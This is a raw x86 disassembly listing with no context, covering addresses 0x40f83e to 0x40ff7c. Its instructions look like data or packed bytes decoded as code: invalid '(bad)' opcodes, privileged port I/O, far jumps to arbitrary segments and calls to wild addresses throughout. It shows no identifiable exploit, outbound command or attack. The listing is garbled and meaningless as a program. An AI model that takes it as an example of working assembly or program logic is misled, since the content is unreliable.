  40f83e:	push   es
  40f83f:	outs   dx,DWORD PTR ds:[esi]
  40f840:	sub    al,0xfa
  40f842:	pushf  
  40f843:	dec    edi
  40f844:	int    0x7e
  40f846:	lock push 0xffffffed
  40f849:	sbb    ch,0xd6
  40f84c:	cmp    DWORD PTR [edx+0x6b4f1b65],ebp
  40f852:	add    al,0xe0
  40f854:	sbb    BYTE PTR [ecx+0xb38e82d],ch
  40f85a:	jnp    0x40f7e4
  40f85c:	jbe    0x40f7f8
  40f85e:	xchg   DWORD PTR ds:0x599c08c2,edx
  40f864:	cmp    al,0x3
  40f866:	pop    esi
  40f867:	sbb    ah,BYTE PTR [edi+ebp*8-0x37]
  40f86b:	jp     0x40f7f1
  40f86d:	cmc    
  40f86e:	xchg   ebx,eax
  40f86f:	aaa    
  40f870:	and    DWORD PTR ds:0x7bbf6639,eax
  40f876:	add    BYTE PTR [ebx+0x62f4e3d1],al
  40f87c:	and    DWORD PTR [edx+ecx*8-0x5a],ebx
  40f880:	call   0x52b9c18b
  40f885:	mov    cs,WORD PTR [ecx-0x11]
  40f888:	or     al,0x64
  40f88a:	inc    ebp
  40f88b:	xor    eax,0xc02828a4
  40f890:	or     ecx,eax
  40f892:	mov    ebx,0x3ef83d4
  40f897:	mov    dl,0x82
  40f899:	in     al,0x9c
  40f89b:	jbe    0x40f848
  40f89d:	mov    edx,0xc7af852a
  40f8a2:	call   0x8b5d5a87
  40f8a7:	das    
  40f8a8:	lahf   
  40f8a9:	stc    
  40f8aa:	and    DWORD PTR [eax+0x55],0xffffff8f
  40f8ae:	js     0x40f8cb
  40f8b0:	sahf   
  40f8b1:	sub    eax,0xe6fdc0c3
  40f8b6:	sbb    DWORD PTR [esi+edx*4],edx
  40f8b9:	push   0x951f0262
  40f8be:	call   0x66237149
  40f8c3:	push   edx
  40f8c4:	arpl   WORD PTR [ebx+0x7c],di
  40f8c7:	and    BYTE PTR [ebx+0x76],cl
  40f8ca:	rol    DWORD PTR ds:0x1bbfd335,0x1d
  40f8d1:	shl    DWORD PTR [ebp+0x33],cl
  40f8d4:	pop    ebx
  40f8d5:	fisubr WORD PTR [edx*1-0x1b2c2a47]
  40f8dc:	gs pop ecx
  40f8de:	ss ins BYTE PTR es:[edi],dx
  40f8e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8e1:	fwait
  40f8e2:	jl     0x40f878
  40f8e4:	dec    ebp
  40f8e5:	imul   ebp,DWORD PTR [ebx-0x664d65e5],0x251a3c90
  40f8ef:	mov    bl,0xf7
  40f8f1:	dec    ecx
  40f8f2:	push   cs
  40f8f3:	idiv   DWORD PTR [eax+0x78e761ee]
  40f8f9:	daa    
  40f8fa:	pop    ecx
  40f8fb:	enter  0xe7a1,0xa0
  40f8ff:	sbb    BYTE PTR [ebx],bh
  40f901:	aam    0x2a
  40f903:	in     al,0xf7
  40f905:	and    al,0x17
  40f907:	inc    esp
  40f908:	gs leave 
  40f90a:	pop    eax
  40f90b:	inc    BYTE PTR [esi-0x299d2b70]
  40f911:	pusha  
  40f912:	adc    DWORD PTR [esi+0x5ed6b3de],edi
  40f918:	inc    dh
  40f91a:	nop
  40f91b:	lock pop esi
  40f91d:	sub    bh,dh
  40f91f:	mov    edx,0x354e4ad0
  40f924:	adc    esi,eax
  40f926:	and    edx,DWORD PTR [edi-0x3b549b4c]
  40f92c:	jge    0x40f94c
  40f92e:	push   es
  40f92f:	push   eax
  40f930:	lods   eax,DWORD PTR ds:[esi]
  40f931:	add    bh,BYTE PTR [ebp-0x14]
  40f934:	push   cs
  40f935:	sbb    al,0x46
  40f937:	mov    cl,0xb9
  40f939:	fidiv  WORD PTR [ecx-0x351f27d0]
  40f93f:	xlat   BYTE PTR ds:[ebx]
  40f940:	or     al,0xd5
  40f942:	sub    BYTE PTR [ebx+0x20],bh
  40f945:	lea    edi,[edi+0x4e363f56]
  40f94b:	clc    
  40f94c:	sbb    DWORD PTR [edi-0x77],edi
  40f94f:	mov    ds:0xae04dcf5,eax
  40f954:	and    al,0xdd
  40f956:	dec    esp
  40f957:	mov    ds:0xd6873b1e,eax
  40f95c:	loop   0x40f928
  40f95e:	into   
  40f95f:	and    cl,BYTE PTR [ecx-0x18ff7960]
  40f965:	push   cs
  40f966:	hlt    
  40f967:	loopne 0x40f8f5
  40f969:	jno    0x40f916
  40f96b:	data16 jae 0x40f99d
  40f96e:	push   edx
  40f96f:	stc    
  40f970:	arpl   ax,si
  40f972:	nop
  40f973:	outs   dx,DWORD PTR ds:[esi]
  40f974:	mov    eax,0xe0dc57f7
  40f979:	dec    edi
  40f97a:	xchg   ebx,eax
  40f97b:	test   BYTE PTR [edi],dh
  40f97d:	cmp    bh,BYTE PTR [eax-0x51503899]
  40f983:	or     BYTE PTR [ecx-0x614916b3],0x13
  40f98a:	repz test eax,0x1376a4bd
  40f990:	add    eax,0x35953ee4
  40f995:	adc    ebx,DWORD PTR [esi+eax*4]
  40f998:	mov    DWORD PTR [ebx],0x71b34783
  40f99e:	add    ah,BYTE PTR [esi-0x40]
  40f9a1:	sbb    eax,edx
  40f9a3:	add    edx,ecx
  40f9a5:	push   eax
  40f9a6:	and    al,0x6f
  40f9a8:	xchg   ebp,eax
  40f9a9:	push   ebp
  40f9aa:	scas   eax,DWORD PTR es:[edi]
  40f9ab:	inc    esi
  40f9ac:	mov    al,0x29
  40f9ae:	mov    DWORD PTR [eax],0xf8d71c1
  40f9b4:	mov    edi,0x4559fab2
  40f9b9:	div    DWORD PTR [eax-0x7d]
  40f9bc:	popa   
  40f9bd:	shr    BYTE PTR [ebp-0x4a],1
  40f9c0:	into   
  40f9c1:	dec    eax
  40f9c2:	(bad)  
  40f9c3:	call   0x9320:0xf67a4bd5
  40f9ca:	(bad)  
  40f9cb:	clc    
  40f9cc:	mov    ds:0xa2f59d6,al
  40f9d1:	jae    0x9de4b6a3
  40f9d7:	inc    edx
  40f9d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9d9:	jne    0x40f9ca
  40f9db:	hlt    
  40f9dc:	dec    eax
  40f9dd:	gs xor dl,bh
  40f9e0:	jmp    0x2c2f75fd
  40f9e5:	add    BYTE PTR [ecx+0x22],bl
  40f9e8:	mov    DWORD PTR [eax+ebx*2-0x40],0xcf76e74f
  40f9f0:	mov    al,ds:0x357ecacf
  40f9f5:	sub    esi,DWORD PTR [ebp-0x45]
  40f9f8:	dec    edx
  40f9f9:	dec    edx
  40f9fa:	das    
  40f9fb:	xor    cl,BYTE PTR [edi]
  40f9fd:	fcom   QWORD PTR [ebx]
  40f9ff:	xchg   BYTE PTR [ecx+0x19843720],dh
  40fa05:	ds ja  0x40f9c5
  40fa08:	push   eax
  40fa09:	mov    cl,BYTE PTR [ebp-0x57]
  40fa0c:	inc    edi
  40fa0d:	lds    ebx,FWORD PTR [esi]
  40fa0f:	pop    ebp
  40fa10:	cmp    ch,BYTE PTR [edx-0x7b]
  40fa13:	mov    ah,BYTE PTR [edi]
  40fa15:	dec    eax
  40fa16:	push   ebx
  40fa17:	push   ebx
  40fa18:	je     0x40f9ce
  40fa1a:	jl     0x40fa88
  40fa1c:	in     al,dx
  40fa1d:	push   ds
  40fa1e:	jns    0x40fa53
  40fa20:	es inc ebx
  40fa22:	jmp    0x9a8a:0x84a8fb00
  40fa29:	sub    eax,0xcf824385
  40fa2e:	(bad)  
  40fa30:	dec    esi
  40fa31:	std    
  40fa32:	(bad)  
  40fa33:	in     eax,0xde
  40fa35:	jo     0x40fa31
  40fa37:	adc    DWORD PTR [edi],ebp
  40fa39:	mov    cl,0x4b
  40fa3b:	jg     0x40fa54
  40fa3d:	sbb    DWORD PTR [ebx-0x40],ecx
  40fa40:	mov    esp,0x743a6dd5
  40fa45:	xchg   ecx,eax
  40fa46:	or     DWORD PTR [edx+ebx*8-0x2e9a8eae],ebx
  40fa4d:	std    
  40fa4e:	sti    
  40fa4f:	mov    esp,0xc979739e
  40fa54:	and    eax,0x2fe68e82
  40fa59:	add    eax,0x66c14e3
  40fa5e:	add    al,0x13
  40fa60:	sub    DWORD PTR [edx+esi*4+0x50],ebx
  40fa64:	aas    
  40fa65:	mov    ebx,DWORD PTR ds:0xfe7406ff
  40fa6b:	jecxz  0x40fab2
  40fa6d:	jle    0x40fab4
  40fa6f:	ret    
  40fa70:	inc    edx
  40fa71:	clc    
  40fa72:	scas   eax,DWORD PTR es:[edi]
  40fa73:	fnstsw WORD PTR [edx]
  40fa75:	stos   DWORD PTR es:[edi],eax
  40fa76:	mov    edi,0x81894f7b
  40fa7b:	neg    DWORD PTR ds:0x8b93b385
  40fa81:	lahf   
  40fa82:	push   eax
  40fa83:	sub    eax,0x1522dc49
  40fa88:	imul   esp,DWORD PTR [esi],0xffffff86
  40fa8b:	adc    DWORD PTR [edx],eax
  40fa8d:	cmp    al,0x33
  40fa8f:	xchg   edx,eax
  40fa90:	and    esp,ebx
  40fa92:	dec    eax
  40fa93:	fisttp QWORD PTR [ebx]
  40fa95:	inc    ecx
  40fa96:	cmp    edi,ebp
  40fa98:	sti    
  40fa99:	jns    0x40fb0b
  40fa9b:	(bad)  
  40fa9c:	and    al,0x55
  40fa9e:	sbb    al,0x47
  40faa0:	mov    al,0xf5
  40faa2:	cmp    ebx,ecx
  40faa4:	add    eax,DWORD PTR [edx]
  40faa6:	lods   al,BYTE PTR ds:[esi]
  40faa7:	or     ch,BYTE PTR [eax+0x3a46b4d9]
  40faad:	ret    
  40faae:	mov    eax,0x76cc23ba
  40fab3:	jbe    0x40faf4
  40fab5:	test   eax,0x78c22d09
  40faba:	pop    ebx
  40fabb:	xchg   ebp,eax
  40fabc:	sbb    eax,0xcee5ce39
  40fac1:	add    al,0x9e
  40fac3:	inc    ebx
  40fac4:	fdivr  DWORD PTR ds:0xba0b49d2
  40faca:	push   esi
  40facb:	jecxz  0x40fb1b
  40facd:	in     eax,0xbc
  40facf:	fdivp  st(3),st
  40fad1:	mov    eax,0xe479976a
  40fad6:	cwde   
  40fad7:	sub    esi,DWORD PTR [ecx+0x12a551fd]
  40fadd:	jle    0x40faf8
  40fadf:	repz or eax,0x23ab0904
  40fae5:	(bad)  
  40fae8:	jo     0x40fb5f
  40faea:	pop    esi
  40faeb:	jecxz  0x40fb57
  40faed:	out    0xca,al
  40faef:	inc    edi
  40faf0:	daa    
  40faf1:	or     al,0x2d
  40faf3:	pop    edx
  40faf4:	mov    bl,0x94
  40faf6:	mov    eax,ds:0xa4d3df37
  40fafb:	into   
  40fafc:	loopne 0x40fb4e
  40fafe:	out    0xe6,al
  40fb00:	inc    esp
  40fb01:	jo     0x40fb08
  40fb03:	in     al,dx
  40fb04:	dec    ecx
  40fb05:	sub    ebp,DWORD PTR [ecx+0x4b134511]
  40fb0b:	push   0x349c260b
  40fb10:	je     0x40fa9d
  40fb12:	or     eax,0x13d9c01
  40fb17:	xor    DWORD PTR [ecx-0x2add4507],esi
  40fb1d:	xchg   BYTE PTR [edi],dl
  40fb1f:	xchg   ebp,eax
  40fb20:	cmp    eax,0x4eb58563
  40fb25:	in     al,dx
  40fb26:	sub    BYTE PTR [ebp-0x4f],dh
  40fb29:	icebp  
  40fb2a:	jmp    0xcf15:0x2b81862b
  40fb31:	sub    al,0xea
  40fb33:	mov    bh,0x23
  40fb35:	dec    esi
  40fb36:	stc    
  40fb37:	mov    dh,0xc9
  40fb39:	hlt    
  40fb3a:	mov    BYTE PTR [ebp+0x1b1d12cc],dh
  40fb40:	lock js 0x40fb28
  40fb43:	inc    ecx
  40fb44:	xchg   esp,eax
  40fb45:	test   al,0x8d
  40fb47:	jp     0x40facd
  40fb49:	(bad)  
  40fb4a:	pop    ebx
  40fb4b:	xor    al,BYTE PTR [ebp+0x55]
  40fb4e:	mov    bl,al
  40fb50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb51:	jbe    0x40fba0
  40fb53:	in     eax,dx
  40fb54:	or     ah,al
  40fb56:	mov    ebx,DWORD PTR [ebx+0x69]
  40fb59:	xchg   ebx,eax
  40fb5a:	pushf  
  40fb5b:	scas   al,BYTE PTR es:[edi]
  40fb5c:	das    
  40fb5d:	add    esi,DWORD PTR ds:0xb20aaa6e
  40fb63:	or     DWORD PTR [esi-0x767058f2],esi
  40fb69:	mov    ebp,DWORD PTR [edi]
  40fb6b:	lahf   
  40fb6c:	or     al,0x5e
  40fb6e:	mov    ebx,ds
  40fb70:	das    
  40fb71:	push   cs
  40fb72:	lods   al,BYTE PTR ds:[esi]
  40fb73:	leave  
  40fb74:	lods   al,BYTE PTR ds:[esi]
  40fb75:	xchg   ebx,eax
  40fb76:	daa    
  40fb77:	stos   BYTE PTR es:[edi],al
  40fb78:	xchg   esp,eax
  40fb79:	sub    ch,BYTE PTR [eax]
  40fb7b:	push   esp
  40fb7c:	dec    ebp
  40fb7d:	inc    ecx
  40fb7e:	jecxz  0x40fbcc
  40fb80:	daa    
  40fb81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb83:	sti    
  40fb84:	inc    edx
  40fb85:	inc    ebx
  40fb86:	call   0xbcc2c62f
  40fb8b:	sbb    BYTE PTR [ecx],ah
  40fb8d:	jl     0x40fb60
  40fb8f:	jg     0x40fbbd
  40fb91:	pushf  
  40fb92:	int    0x7
  40fb94:	xor    esp,ebp
  40fb96:	fs ins DWORD PTR es:[edi],dx
  40fb98:	push   es
  40fb99:	es dec ecx
  40fb9b:	in     al,0x30
  40fb9d:	push   eax
  40fb9e:	addr16 sti 
  40fba0:	mov    DWORD PTR [ebp+0x3a4ed207],ebx
  40fba6:	in     eax,0x9d
  40fba8:	pushf  
  40fba9:	adc    cl,BYTE PTR [esi-0x10]
  40fbac:	adc    bh,dl
  40fbae:	pop    ecx
  40fbaf:	mov    esi,0x70f4c984
  40fbb4:	dec    ebx
  40fbb5:	pop    esp
  40fbb6:	mov    edi,0xcabc8d4e
  40fbbb:	adc    esi,DWORD PTR [esi+0x26]
  40fbbe:	xchg   ebp,eax
  40fbbf:	pusha  
  40fbc0:	push   0x1d
  40fbc2:	jle    0x40fc02
  40fbc4:	jecxz  0x40fc1c
  40fbc6:	mov    ebx,0x430d20ba
  40fbcb:	xor    ebp,esi
  40fbcd:	sub    al,0xa5
  40fbcf:	out    0xd7,eax
  40fbd1:	ins    DWORD PTR es:[edi],dx
  40fbd2:	shl    BYTE PTR [esi],0xa2
  40fbd5:	ret    0x98d8
  40fbd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbd9:	sub    al,0x5a
  40fbdb:	mov    al,BYTE PTR [eax+0x22]
  40fbde:	ds dec ebp
  40fbe0:	cs pop ds
  40fbe2:	xor    bh,BYTE PTR [eax-0x30]
  40fbe5:	inc    ecx
  40fbe6:	xchg   ebx,eax
  40fbe7:	mov    ebp,0xb14e0b7c
  40fbec:	push   0xffffffb1
  40fbee:	jmp    0x40fc6a
  40fbf0:	icebp  
  40fbf1:	add    dh,BYTE PTR [edx-0x50]
  40fbf4:	fucom  st(1)
  40fbf6:	pushf  
  40fbf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbf8:	jp     0x40fbb9
  40fbfa:	js     0x40fbc8
  40fbfc:	cmp    al,0x5f
  40fbfe:	popf   
  40fbff:	(bad)  
  40fc00:	mov    ecx,0xd990cd67
  40fc05:	mov    ds:0x140678eb,eax
  40fc0a:	pop    ecx
  40fc0b:	mov    ds:0x92af0c53,eax
  40fc10:	jecxz  0x40fc06
  40fc12:	cmp    al,0x79
  40fc14:	call   0x29e0:0x8c525b27
  40fc1b:	aam    0x29
  40fc1d:	(bad)  
  40fc1e:	xlat   BYTE PTR ds:[ebx]
  40fc1f:	and    eax,0x6f463de3
  40fc24:	scas   al,BYTE PTR es:[edi]
  40fc25:	pushf  
  40fc26:	data16 sbb BYTE PTR [esi-0x518c8de1],bh
  40fc2d:	dec    ebp
  40fc2e:	push   esp
  40fc2f:	lods   eax,DWORD PTR ds:[esi]
  40fc30:	in     eax,0x1f
  40fc32:	add    al,0x76
  40fc34:	xor    eax,0x8ce53f31
  40fc39:	sub    eax,0x2c27cf94
  40fc3e:	mov    eax,0x8031c81a
  40fc43:	in     eax,dx
  40fc44:	or     dh,cl
  40fc46:	leave  
  40fc47:	(bad)  
  40fc48:	push   cs
  40fc49:	in     eax,dx
  40fc4a:	outs   dx,DWORD PTR ds:[esi]
  40fc4b:	(bad)
  40fc4e:	push   ebp
  40fc4f:	or     BYTE PTR [ebp-0x3ccf72ac],0x8a
  40fc56:	dec    ebp
  40fc57:	aas    
  40fc58:	xor    BYTE PTR [edx-0x63],0xce
  40fc5c:	sub    DWORD PTR [ebx+0x28],ebx
  40fc5f:	jp     0x40fbec
  40fc61:	mov    ds:0xf9ec879e,eax
  40fc66:	pop    ss
  40fc67:	mov    BYTE PTR [edx+0x1d],dh
  40fc6a:	add    al,0x44
  40fc6c:	fsubr  DWORD PTR [edi+0x5a]
  40fc6f:	(bad)
  40fc73:	(bad)  
  40fc74:	pop    ecx
  40fc75:	adc    ch,al
  40fc77:	pop    eax
  40fc78:	inc    ecx
  40fc79:	call   0x27f00f3e
  40fc7e:	mov    dl,BYTE PTR [edi]
  40fc80:	ret    0xab2d
  40fc83:	in     al,0x50
  40fc85:	sbb    BYTE PTR ds:0x79b48b9e,0xcf
  40fc8c:	repnz dec ebx
  40fc8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc8f:	cmp    DWORD PTR [ebp-0x51484415],esi
  40fc95:	sar    DWORD PTR [edx],1
  40fc97:	into   
  40fc98:	mov    ecx,0x895f3042
  40fc9d:	lods   eax,DWORD PTR ds:[esi]
  40fc9e:	mov    eax,0xd983445a
  40fca3:	sbb    DWORD PTR [eax+eax*8],esi
  40fca6:	inc    ebp
  40fca7:	and    DWORD PTR [ebx+0x35abf0b3],ecx
  40fcad:	and    al,0xf9
  40fcaf:	and    BYTE PTR [ebx],dl
  40fcb1:	sahf   
  40fcb2:	xor    DWORD PTR [esi+ebp*2+0x4a],esp
  40fcb6:	or     bh,dl
  40fcb8:	adc    BYTE PTR [ecx],0xe7
  40fcbb:	adc    bl,BYTE PTR [eax]
  40fcbd:	shr    ebp,0x42
  40fcc0:	pop    edx
  40fcc1:	jo     0x40fc6e
  40fcc3:	jns    0x40fcd5
  40fcc5:	ror    BYTE PTR [ebx+0x78c0861e],1
  40fccb:	mov    esp,0x9cc91cfa
  40fcd0:	sbb    esi,DWORD PTR [edi]
  40fcd2:	fistp  WORD PTR [esi-0x3f]
  40fcd5:	pop    ebx
  40fcd6:	and    DWORD PTR [esi-0x4f],esp
  40fcd9:	addr16 std 
  40fcdb:	cwde   
  40fcdc:	jecxz  0x40fc96
  40fcde:	pop    ds
  40fcdf:	not    BYTE PTR [ecx+0x2edfb9cc]
  40fce5:	xor    DWORD PTR ds:0xbd397f8e,ebx
  40fceb:	div    ebx
  40fced:	mov    ebp,0x4a7c8037
  40fcf2:	aaa    
  40fcf3:	lods   eax,DWORD PTR ds:[esi]
  40fcf4:	dec    BYTE PTR [eax+0x38]
  40fcf7:	sub    BYTE PTR [edi-0x15],ch
  40fcfa:	sub    eax,esi
  40fcfc:	imul   ebx,DWORD PTR [ebx+ebx*4],0x34
  40fd00:	mov    ecx,0x4f7a3ad4
  40fd05:	in     eax,0x2b
  40fd07:	jmp    0x40fc9e
  40fd09:	popf   
  40fd0a:	adc    eax,0x315d4f8f
  40fd0f:	mov    cl,bl
  40fd11:	fcomp  DWORD PTR [esi]
  40fd13:	push   0x5e
  40fd15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd16:	mov    ds:0xb38c9244,eax
  40fd1b:	inc    edi
  40fd1c:	inc    edi
  40fd1d:	dec    BYTE PTR [ebx+ebx*2]
  40fd20:	stos   DWORD PTR es:[edi],eax
  40fd21:	sbb    DWORD PTR ds:0x6cfd0853,ebx
  40fd27:	lahf   
  40fd28:	add    dl,BYTE PTR [esi-0x529fe673]
  40fd2e:	xor    cl,BYTE PTR [ebx]
  40fd30:	in     al,dx
  40fd31:	pop    esp
  40fd32:	leave  
  40fd33:	mov    eax,0xcba1ea9b
  40fd38:	addr16 pop esi
  40fd3a:	imul   eax,DWORD PTR [ecx],0xf650afa2
  40fd40:	int    0xaf
  40fd42:	out    0xe5,eax
  40fd44:	sar    al,1
  40fd46:	inc    edi
  40fd47:	pop    ds
  40fd48:	mov    ah,0x5e
  40fd4a:	push   edi
  40fd4b:	dec    ebx
  40fd4c:	sub    al,0x33
  40fd4e:	int3   
  40fd4f:	daa    
  40fd50:	out    0xeb,eax
  40fd52:	or     eax,0x1484d527
  40fd57:	mov    WORD PTR [ecx+0x7b],es
  40fd5a:	and    al,0xf2
  40fd5c:	pop    eax
  40fd5d:	inc    edx
  40fd5e:	in     al,dx
  40fd5f:	xchg   ebx,eax
  40fd60:	outs   dx,DWORD PTR ds:[esi]
  40fd61:	retf   0x5a88
  40fd64:	enter  0xde2b,0x90
  40fd68:	imul   edi,DWORD PTR [ebp-0x51],0xf25da206
  40fd6f:	push   ecx
  40fd70:	push   edx
  40fd71:	mov    al,0xa6
  40fd73:	push   esi
  40fd74:	push   edi
  40fd75:	mov    cl,0xfd
  40fd77:	cmp    ebx,esp
  40fd79:	nop
  40fd7a:	aaa    
  40fd7b:	fcomip st,st(5)
  40fd7d:	ror    BYTE PTR [ebp+0x540946b4],cl
  40fd83:	cmp    BYTE PTR ds:0x46b199ec,0x5a
  40fd8a:	pop    ebp
  40fd8b:	popa   
  40fd8c:	fcom   DWORD PTR [ecx-0x33]
  40fd8f:	inc    esp
  40fd90:	scas   al,BYTE PTR es:[edi]
  40fd91:	xchg   esi,eax
  40fd92:	in     al,dx
  40fd93:	divps  xmm2,xmm4
  40fd96:	sbb    eax,0x36866b6e
  40fd9b:	sahf   
  40fd9c:	retf   0xf957
  40fd9f:	jne    0x40fd85
  40fda1:	pop    ebp
  40fda2:	sbb    bl,ch
  40fda4:	jns    0x40fdad
  40fda6:	adc    eax,esp
  40fda8:	mov    al,0x5f
  40fdaa:	pop    ebp
  40fdab:	mov    ds:0x92ae4051,al
  40fdb0:	mov    edx,0x34d2cda8
  40fdb5:	pop    esi
  40fdb6:	and    eax,0xfa7e7237
  40fdbb:	xchg   BYTE PTR [ecx-0x7a],ah
  40fdbe:	imul   ecx,eax,0xffffff8d
  40fdc1:	fs retf 0x4743
  40fdc5:	lea    eax,[ebp-0x5b]
  40fdc8:	les    ebx,FWORD PTR [edi-0x32]
  40fdcb:	or     ebx,DWORD PTR [edi+eiz*4-0xb3d0be0]
  40fdd2:	inc    ebx
  40fdd3:	cmp    BYTE PTR [esi+eiz*2-0x2b],dh
  40fdd7:	inc    esi
  40fdd8:	adc    eax,0x483e565c
  40fddd:	fst    QWORD PTR [edx]
  40fddf:	ficomp WORD PTR ds:[ebx-0xba4eedc]
  40fde6:	pop    esp
  40fde7:	xchg   ebx,eax
  40fde8:	cld    
  40fde9:	mov    eax,ds:0x7c7061af
  40fdee:	leave  
  40fdef:	cwde   
  40fdf0:	mov    eax,0x7b947c42
  40fdf5:	push   0x11e6dbc
  40fdfa:	aaa    
  40fdfb:	js     0x40fe06
  40fdfd:	jb     0x40fe5e
  40fdff:	aas    
  40fe00:	lods   al,BYTE PTR ds:[esi]
  40fe01:	lock adc dh,BYTE PTR [ebp+0x55]
  40fe05:	jae    0x40fdaf
  40fe07:	jg     0x40fe82
  40fe09:	popf   
  40fe0a:	fnsave [ebx+eiz*8+0x17]
  40fe0e:	out    dx,eax
  40fe0f:	pop    ecx
  40fe10:	pop    es
  40fe11:	je     0x40fe29
  40fe13:	jno    0x40fde9
  40fe15:	adc    BYTE PTR [edx-0x78134de6],bh
  40fe1b:	ret    0x1118
  40fe1e:	add    esi,ebp
  40fe20:	scas   al,BYTE PTR es:[edi]
  40fe21:	ja     0x40fe77
  40fe23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe24:	mov    dl,0xca
  40fe26:	inc    eax
  40fe27:	and    esi,DWORD PTR [edx]
  40fe29:	jg     0x40fe59
  40fe2b:	leave  
  40fe2c:	loope  0x40fe35
  40fe2e:	inc    edi
  40fe2f:	(bad)  
  40fe30:	push   0x5f
  40fe32:	add    edi,DWORD PTR [eax-0x9ccd5af]
  40fe38:	mov    ds:0x9719e9bd,eax
  40fe3d:	mov    edx,DWORD PTR [ecx+0x504fd658]
  40fe43:	pop    eax
  40fe44:	push   cs
  40fe45:	pop    ebx
  40fe46:	xchg   BYTE PTR [ebx-0x13],bh
  40fe49:	es dec ebx
  40fe4b:	bound  esp,QWORD PTR [ebp-0x79f64d6d]
  40fe51:	ror    DWORD PTR [esi],cl
  40fe53:	cmp    BYTE PTR [edx+0x69dfb4ee],dl
  40fe59:	jns    0x40fe1d
  40fe5b:	inc    edi
  40fe5c:	ror    BYTE PTR [edx-0x78c3cbb2],1
  40fe62:	aam    0x57
  40fe64:	push   edi
  40fe65:	out    dx,al
  40fe66:	cmc    
  40fe67:	sub    ah,BYTE PTR [esi-0x2881b3e6]
  40fe6d:	inc    ebx
  40fe6e:	sbb    BYTE PTR [ebx+esi*8],ah
  40fe71:	jp     0x40fe5f
  40fe73:	or     DWORD PTR [ebx],eax
  40fe75:	fwait
  40fe76:	dec    edx
  40fe77:	dec    ebx
  40fe78:	and    al,0xb6
  40fe7a:	outs   dx,BYTE PTR ds:[esi]
  40fe7b:	repnz and esi,DWORD PTR [esi-0x7e504915]
  40fe82:	pop    ds
  40fe83:	mov    eax,ds:0x993f31ba
  40fe88:	adc    eax,0x34a6613d
  40fe8d:	fs sbb dl,bh
  40fe90:	outs   dx,BYTE PTR ds:[esi]
  40fe91:	sbb    DWORD PTR [ecx+0x12],edx
  40fe94:	addr16 dec eax
  40fe96:	push   es
  40fe97:	inc    esp
  40fe98:	jne    0x40fef1
  40fe9a:	cli    
  40fe9b:	xchg   esi,eax
  40fe9c:	in     eax,0x78
  40fe9e:	push   ss
  40fe9f:	(bad)  
  40fea0:	sbb    edx,DWORD PTR [esi]
  40fea2:	addr16 cwde 
  40fea4:	sbb    BYTE PTR [edx],bl
  40fea6:	mov    edi,0xa92e9efd
  40feab:	das    
  40feac:	popa   
  40fead:	out    dx,eax
  40feae:	lea    esi,[ecx+0x7aa6d525]
  40feb4:	popf   
  40feb5:	lods   eax,DWORD PTR ds:[esi]
  40feb6:	retf   
  40feb7:	mov    ah,0x48
  40feb9:	cdq    
  40feba:	mov    cl,0x5e
  40febc:	retf   
  40febd:	jmp    DWORD PTR [ebx-0x2b]
  40fec0:	data16 fadd DWORD PTR [edi-0xdf2660a]
  40fec7:	mov    DWORD PTR [edx+0x4],eax
  40feca:	fldenv [ebp-0x9]
  40fecd:	out    dx,al
  40fece:	dec    esp
  40fecf:	out    0x3,al
  40fed1:	pop    eax
  40fed2:	inc    esp
  40fed3:	out    dx,al
  40fed4:	adc    al,dl
  40fed6:	adc    BYTE PTR [eax-0x5d0edc01],al
  40fedc:	jmp    0x7bfd2463
  40fee1:	xchg   DWORD PTR [edx+0x5e],esp
  40fee4:	jne    0x40fee3
  40fee6:	xor    al,0x7e
  40fee8:	mov    eax,ds:0x3ba64c2e
  40feed:	sub    DWORD PTR [ebx],edi
  40feef:	rcl    DWORD PTR [eax],1
  40fef1:	(bad)  
  40fef2:	stos   BYTE PTR es:[edi],al
  40fef3:	hlt    
  40fef4:	push   edi
  40fef5:	xchg   esi,eax
  40fef6:	addr16 xor al,0x80
  40fef9:	aas    
  40fefa:	ror    BYTE PTR [ecx+ebx*2],cl
  40fefd:	out    0xbf,al
  40feff:	shl    al,0xbd
  40ff02:	dec    ebp
  40ff03:	and    DWORD PTR [eax],ebp
  40ff05:	mov    eax,ds:0x41af1fb5
  40ff0a:	sub    DWORD PTR [edi],esp
  40ff0c:	jae    0x40fea7
  40ff0e:	sbb    eax,0x4e2ae5ae
  40ff13:	jl     0x40fefd
  40ff15:	in     al,0x3b
  40ff17:	mul    bl
  40ff19:	(bad)  
  40ff1a:	fiadd  DWORD PTR [ebp+0x39]
  40ff1d:	xchg   edx,eax
  40ff1e:	jge    0x40ff0a
  40ff20:	add    edi,DWORD PTR [ecx+esi*8+0x41]
  40ff24:	push   ebx
  40ff25:	aad    0xc5
  40ff27:	(bad)  
  40ff28:	std    
  40ff29:	cwde   
  40ff2a:	dec    edx
  40ff2b:	mov    ecx,edx
  40ff2d:	int3   
  40ff2e:	inc    edx
  40ff2f:	mov    bl,0xa6
  40ff31:	xchg   ebx,eax
  40ff32:	aaa    
  40ff33:	scas   al,BYTE PTR es:[edi]
  40ff34:	dec    esi
  40ff35:	jb     0x40ff90
  40ff37:	clc    
  40ff38:	(bad)  
  40ff39:	pop    eax
  40ff3a:	add    cl,BYTE PTR [ecx-0x13]
  40ff3d:	jns    0x40ff2c
  40ff3f:	jmp    0xe0b4:0x5f846b3d
  40ff46:	neg    cl
  40ff48:	add    al,0x0
  40ff4a:	out    0x71,al
  40ff4c:	gs jmp 0xea95f82a
  40ff52:	iret   
  40ff53:	jmp    0xb43ded0b
  40ff58:	icebp  
  40ff59:	out    0xcf,eax
  40ff5b:	mov    ebx,0xb598f4bf
  40ff60:	mov    ebp,0x1d80b7b6
  40ff65:	mov    ch,0x40
  40ff67:	cmp    dl,dh
  40ff69:	inc    edi
  40ff6a:	jo     0x40feec
  40ff6c:	and    BYTE PTR [edx+edi*8],0xd7
  40ff70:	adc    al,0x20
  40ff72:	xor    DWORD PTR [eax+0x3e],0xceb9337
  40ff79:	cli    
  40ff7a:	push   ds
  40ff7b:	push   edi
  40ff7c:	gs pop ds
